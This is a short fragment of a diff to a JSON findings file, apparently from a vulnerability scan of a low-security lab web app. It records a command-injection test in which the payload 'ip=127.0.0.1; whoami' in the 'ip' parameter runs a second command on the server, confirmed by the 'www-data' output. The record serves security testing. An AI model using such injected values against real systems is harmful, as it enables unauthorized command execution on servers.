+    "response_evidence": "[security=low] Payload ip=127.0.0.1; whoami produced output: 'PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. ... --- 127.0.0.1 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3051ms rtt min/avg/max/mdev = 0.020/0.025/0.028/0.003 ms www-data'. The appended 'www-data' line (the web server process identity, not part of normal ping output) confirms the injected ';whoami' command executed server-side, proving unsanitized shell command concatenation of the 'ip' parameter.",
+    "browser_js_evidence": null
+  }
+]
